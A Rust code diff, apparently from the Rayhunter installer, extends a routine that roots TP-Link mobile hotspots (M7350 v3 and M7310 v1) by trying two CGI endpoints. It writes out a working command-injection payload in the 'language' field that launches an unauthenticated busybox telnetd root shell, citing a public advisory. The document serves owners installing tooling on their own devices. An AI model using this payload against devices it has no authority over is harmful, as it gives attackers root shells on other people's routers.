@@ -40,24 +40,28 @@ struct V3RootResponse {
 }
 
 pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
-    let qcmap_web_cgi_endpoint = format!("http://{admin_ip}/cgi-bin/qcmap_web_cgi");
     let client = reqwest::Client::new();
 
     println!("Launching telnet on the device");
 
-    // https://github.com/advisories/GHSA-ffwq-9r7p-3j6r
-    // in particular: https://www.yuque.com/docs/share/fca60ef9-e5a4-462a-a984-61def4c9b132
-    let response = client.post(&qcmap_web_cgi_endpoint)
-        .body(r#"{"module": "webServer", "action": 1, "language": "EN';echo $(busybox telnetd -l /bin/sh);echo 1'"}"#)
-        .send()
-        .await?;
+    for endpoint in [
+        // TP-Link M7350 v3
+        // https://github.com/advisories/GHSA-ffwq-9r7p-3j6r
+        // in particular: https://www.yuque.com/docs/share/fca60ef9-e5a4-462a-a984-61def4c9b132
+        format!("http://{admin_ip}/cgi-bin/qcmap_web_cgi"),
+        // TP-Link M7310 v1
+        // (adaptation of M7350 exploit
+        format!("http://{admin_ip}/cgi-bin/web_cgi"),
+    ] {
+        let response = client.post(&endpoint)
+            .body(r#"{"module": "webServer", "action": 1, "language": "EN';echo $(busybox telnetd -l /bin/sh);echo 1'"}"#)
+            .send()
+            .await?;
 
-    let is_v3 = response.status() != 404;
+        if response.status() == 404 {
+            continue;
+        }
 
-    if !is_v3 {
-        println!("Got a 404 trying to run exploit for hardware revision v3, trying v5 exploit");
-        tplink_launch_telnet_v5(admin_ip).await?;
-    } else {
         let V3RootResponse { result } = response.error_for_status()?.json().await?;
 
         if result != 0 {
@@ -67,7 +71,7 @@ pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
         // resetting the language is important because otherwise the tplink's admin interface is
         // unusuable.
         let V3RootResponse { result } = client
-            .post(&qcmap_web_cgi_endpoint)
+            .post(&endpoint)
             .body(r#"{"module": "webServer", "action": 1, "language": "en"}"#)
             .send()
             .await?
@@ -80,12 +84,13 @@ pub async fn start_telnet(admin_ip: &str) -> Result<bool, Error> {
         }
 
         println!("Detected hardware revision v3");
+        return Ok(true);
     }
 
-    println!(
-        "Succeeded in rooting the device! Now you can use 'telnet {admin_ip}' to get a root shell. Use './installer util tplink-start-telnet' to root again without installing rayhunter."
-    );
-    Ok(is_v3)
+    println!("Got a 404 trying to run exploit for hardware revision v3, trying v5 exploit");
+    tplink_launch_telnet_v5(admin_ip).await?;
+
+    Ok(false)
 }
 
 async fn tplink_run_install(
